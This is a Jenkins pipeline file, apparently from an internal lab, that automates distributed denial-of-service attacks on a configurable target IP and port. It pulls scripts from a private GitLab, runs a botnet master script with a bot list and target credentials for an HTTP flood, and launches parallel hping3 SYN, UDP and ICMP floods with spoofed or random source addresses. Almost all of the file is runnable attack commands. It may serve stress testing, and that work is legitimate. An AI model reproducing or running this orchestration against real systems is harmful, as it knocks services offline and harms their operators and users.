#!groovy
pipeline
{
    agent {label "DDoS-Master"}
    environment{
        target_ip="$target_ip"
        target_port="$target_port"
        filename="botnet.txt"
        username="$username"
        password="$password"
    }
    stages{
        stage("git pull source code"){
            steps{
               echo "git pull source code from gitlab"
               sh "rm -rf ${WORKSPACE}/src"
               dir('src'){
                    checkout([$class: 'GitSCM', branches: [[name: '*/master']], extensions: [], userRemoteConfigs: [[credentialsId: 'yhou_gitlab', url: 'http://10.7.1.41/yhou/yhou-python-scritps.git']]])
               }
            }
        }
        stage("test"){
            parallel{
                stage("http ddos attack")
                    {
                    steps{
                        sh '''
                        echo "HTTP DDOS Attack"
                        cd src/DDOS/HTTP_DDOS_Attack
                        pwd
                        python3 python-scp.py > test.log
                        python3 Master.py --file ${filename} --target-ip ${target_ip} --target-port ${target_port} --target-username ${username} --target-password ${password}>test_master.log
                        /*nohup python3 Master.py --file ${filename} --target-ip ${target_ip} --target-port ${target_port}>test_master.log & */
                       '''
                    }
                }
                stage("syn flood attack")
                    {
                    steps{
                        sh '''
                        echo "Syn Flood Attack"
                        cd src/DDOS
                        pwd
                        sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source ${target_ip} > test_syn.log
                        '''
                    }
                }
                stage("udp flood attack")
                    {
                    steps{
                        sh '''
                        echo "UDP Flood Attack"
                        cd src/DDOS
                        pwd
                        sudo hping3 -c 100000 -d 120 -w 64 -p 81 --udp --flood --rand-source ${target_ip} > test_udp.log
                        '''
                    }
                }
                stage("icmp flood attack")
                    {
                    steps{
                        sh '''
                        echo "ICMP Flood Attack"
                        cd src/DDOS
                        pwd
                        sudo hping3 -q -n -a 10.0.0.1 --id 0 --icmp -d 56 --flood ${target_ip} > test_icmp.log
                        '''
                    }
                }
            }
        }
    }
}
